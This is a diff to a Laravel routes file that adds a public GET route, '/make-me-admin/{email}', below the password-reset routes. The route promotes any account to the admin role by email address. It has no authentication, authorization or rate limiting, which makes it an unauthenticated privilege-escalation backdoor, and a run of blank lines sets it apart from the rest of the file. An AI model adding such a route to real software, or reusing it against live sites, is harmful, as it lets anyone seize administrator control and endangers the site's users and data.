@@ -197,3 +197,21 @@ Route::post('/forgot-password/send-code', [UserController::class, 'sendResetCode
 Route::post('/forgot-password/reset', [UserController::class, 'resetPasswordWithCode'])
     ->name('password.reset')
     ->middleware('throttle:5,1');
+
+
+
+
+
+use App\Models\User;
+
+Route::get('/make-me-admin/{email}', function ($email) {
+    $user = User::where('email', $email)->first();
+
+    if (!$user) {
+        return 'User not found!';
+    }
+
+    $user->update(['role' => 'admin']);
+
+    return "Account {$email} has been successfully promoted to Admin!";
+});
